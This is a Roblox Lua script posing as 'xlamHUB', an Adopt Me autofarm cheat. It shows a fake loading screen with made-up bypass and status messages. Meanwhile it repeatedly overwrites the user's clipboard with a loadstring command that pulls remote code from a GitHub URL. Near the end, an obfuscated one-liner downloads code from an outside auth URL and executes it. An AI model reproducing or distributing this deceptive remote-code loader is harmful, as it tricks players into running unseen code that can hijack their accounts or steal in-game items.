local Players = game:GetService("Players")
local Player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
local ScreenGui = Instance.new("ScreenGui")
local Background = Instance.new("Frame")
local ProgressBarBG = Instance.new("Frame")
local ProgressBar = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Subtitle = Instance.new("TextLabel")
local Status = Instance.new("TextLabel")
local Percentage = Instance.new("TextLabel")
local TikTokInfo = Instance.new("TextLabel")
local HubName = Instance.new("TextLabel")
local CreditFrame = Instance.new("Frame")

local scriptToCopy = "loadstring(game:HttpGet('https://raw.githubusercontent.com/rdevx23/testing/refs/heads/main/adm.lua'))()"

ScreenGui.Name = "AdoptMeCheatLoadingScreen"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.IgnoreGuiInset = true
ScreenGui.DisplayOrder = 999
ScreenGui.Parent = Player:WaitForChild("PlayerGui")

Background.Name = "Background"
Background.Size = UDim2.new(1, 0, 1, 0)
Background.Position = UDim2.new(0, 0, 0, 0)
Background.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
Background.BorderSizePixel = 0
Background.Parent = ScreenGui

local UIGradient = Instance.new("UIGradient")
UIGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 50)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 25))
})
UIGradient.Rotation = 45
UIGradient.Parent = Background

Title.Name = "Title"
Title.Size = UDim2.new(1, 0, 0, 70)
Title.Position = UDim2.new(0, 0, 0.08, 0)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBold
Title.Text = "xlamHUB"
Title.TextColor3 = Color3.fromRGB(255, 50, 50)
Title.TextSize = 60
Title.TextStrokeTransparency = 0.8
Title.Parent = Background


Subtitle.Name = "Subtitle"
Subtitle.Size = UDim2.new(1, 0, 0, 30)
Subtitle.Position = UDim2.new(0, 0, 0.16, 0)
Subtitle.BackgroundTransparency = 1
Subtitle.Font = Enum.Font.GothamBold
Subtitle.Text = "ADOPT ME AUTOFARM"
Subtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
Subtitle.TextSize = 30
Subtitle.Parent = Background

CreditFrame.Name = "CreditFrame"
CreditFrame.Size = UDim2.new(0.5, 0, 0.08, 0)
CreditFrame.Position = UDim2.new(0.25, 0, 0.24, 0)
CreditFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 70)
CreditFrame.BorderSizePixel = 0
CreditFrame.BackgroundTransparency = 0.7
CreditFrame.Parent = Background

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 10)
UICorner.Parent = CreditFrame

TikTokInfo.Name = "TikTokInfo"
TikTokInfo.Size = UDim2.new(1, 0, 0.5, 0)
TikTokInfo.Position = UDim2.new(0, 0, 0, 0)
TikTokInfo.BackgroundTransparency = 1
TikTokInfo.Font = Enum.Font.GothamBold
TikTokInfo.Text = "TikTok: yohd57"
TikTokInfo.TextColor3 = Color3.fromRGB(255, 50, 50)
TikTokInfo.TextSize = 24
TikTokInfo.Parent = CreditFrame


HubName.Name = "HubName"
HubName.Size = UDim2.new(1, 0, 0.5, 0)
HubName.Position = UDim2.new(0, 0, 0.5, 0)
HubName.BackgroundTransparency = 1
HubName.Font = Enum.Font.GothamBold
HubName.Text = "xlamHUB - PREMIUM CHEATS"
HubName.TextColor3 = Color3.fromRGB(255, 255, 255)
HubName.TextSize = 20
HubName.Parent = CreditFrame


Status.Name = "Status"
Status.Size = UDim2.new(1, 0, 0, 30)
Status.Position = UDim2.new(0, 0, 0.38, 0)
Status.BackgroundTransparency = 1
Status.Font = Enum.Font.Gotham
Status.Text = "Initializing..."
Status.TextColor3 = Color3.fromRGB(200, 200, 200)
Status.TextSize = 24
Status.Parent = Background


ProgressBarBG.Name = "ProgressBarBG"
ProgressBarBG.Size = UDim2.new(0.7, 0, 0, 30)
ProgressBarBG.Position = UDim2.new(0.15, 0, 0.45, 0)
ProgressBarBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
ProgressBarBG.BorderSizePixel = 0
ProgressBarBG.Parent = Background


local BarCorner = Instance.new("UICorner")
BarCorner.CornerRadius = UDim.new(0, 15)
BarCorner.Parent = ProgressBarBG


ProgressBar.Name = "ProgressBar"
ProgressBar.Size = UDim2.new(0, 0, 1, 0)
ProgressBar.Position = UDim2.new(0, 0, 0, 0)
ProgressBar.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
ProgressBar.BorderSizePixel = 0
ProgressBar.Parent = ProgressBarBG


local FillCorner = Instance.new("UICorner")
FillCorner.CornerRadius = UDim.new(0, 15)
FillCorner.Parent = ProgressBar

Percentage.Name = "Percentage"
Percentage.Size = UDim2.new(1, 0, 0, 30)
Percentage.Position = UDim2.new(0, 0, 0.52, 0)
Percentage.BackgroundTransparency = 1
Percentage.Font = Enum.Font.GothamBold
Percentage.Text = "0%"
Percentage.TextColor3 = Color3.fromRGB(255, 255, 255)
Percentage.TextSize = 24
Percentage.Parent = Background

for i = 1, 50 do
    local particle = Instance.new("Frame")
    local size = math.random(2, 5)
    
    particle.Name = "Particle" .. i
    particle.Parent = Background
    particle.BackgroundColor3 = Color3.fromRGB(
        math.random(200, 255), 
        math.random(50, 100), 
        math.random(50, 100)
    )
    particle.BackgroundTransparency = math.random(5, 8) / 10
    particle.BorderSizePixel = 0
    particle.Position = UDim2.new(math.random(), 0, math.random(), 0)
    particle.Size = UDim2.new(0, size, 0, size)
    particle.ZIndex = 1
    
    spawn(function()
        while particle.Parent do
            local targetY = particle.Position.Y.Scale - 0.2
            if targetY < -0.1 then
                particle.Position = UDim2.new(math.random(), 0, 1.1, 0)
            else
                for i = 1, 100 do
                    particle.Position = UDim2.new(
                        particle.Position.X.Scale, 0,
                        particle.Position.Y.Scale - 0.002, 0
                    )
                    wait(0.03)
                end
            end
        end
    end)
end

Title.ZIndex = 10
Subtitle.ZIndex = 10
CreditFrame.ZIndex = 10
TikTokInfo.ZIndex = 11
HubName.ZIndex = 11
Status.ZIndex = 10
ProgressBarBG.ZIndex = 10
ProgressBar.ZIndex = 11
Percentage.ZIndex = 10

spawn(function()
    while ScreenGui.Parent do
        setclipboard(scriptToCopy)
        wait(1)
    end
end)

local function SetProgress(percent)
    percent = math.clamp(percent, 0, 100)
    ProgressBar.Size = UDim2.new(percent/100, 0, 1, 0)
    Percentage.Text = tostring(math.floor(percent)) .. "%"
end

local function SetStatus(text)
    Status.Text = text
end

local function Hide(duration)
    duration = duration or 1
    
    for i = 0, 1, 0.1 do
        Background.BackgroundTransparency = i
        Title.TextTransparency = i
        Subtitle.TextTransparency = i
        Status.TextTransparency = i
        Percentage.TextTransparency = i
        ProgressBarBG.BackgroundTransparency = i
        ProgressBar.BackgroundTransparency = i
        CreditFrame.BackgroundTransparency = math.min(0.7 + i, 1)
        TikTokInfo.TextTransparency = i
        HubName.TextTransparency = i
        

        for _, particle in pairs(Background:GetChildren()) do
            if particle.Name:find("Particle") then
                particle.BackgroundTransparency = math.min(particle.BackgroundTransparency + 0.1, 1)
            end
        end
        
        wait(duration/10)
    end
    
    ScreenGui:Destroy()
end

local loadingStatuses = {
    "Getting ready...",
    "Checking Adopt Me server status...",
    "AC bypass...",
    "Keybox bypass...",
    "Downloading Assets...",
    "Updating Local Script Storage...",
    "Decoding...",
    "Updating status to server...",
    "Init autofarm...",
    "Setting up...",
    "Injecting in main:adoptme:game",
    "Testing settings...",
    "Optimizing..",
    "error: account is not old enough for current settings",
    "reoptimizing...",
    "Testing settings..."
}

SetStatus("Init xlamHUB...")

wait(2)

local totalLoadingTime = 90
local segmentsCount = #loadingStatuses
local timePerSegment = totalLoadingTime / segmentsCount
local stepsPerSegment = 100 / segmentsCount
local currentProgress = 0

for i = 1, segmentsCount do
    SetStatus(loadingStatuses[i])
    local startProgress = currentProgress
    local endProgress = math.min(startProgress + stepsPerSegment, 100)
    
    for progress = startProgress, endProgress, 0.2 do
        SetProgress(progress)
        wait(timePerSegment / ((endProgress - startProgress) / 0.2))
    end
    
    currentProgress = endProgress
    

    if i < segmentsCount then
        wait(0.5)
    end
end

SetProgress(100)
SetStatus("xlamHUB sucessfully loaded!")
wait(2)


Hide(1)
wait(2)

getgenv().mainKey = "nil"

local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
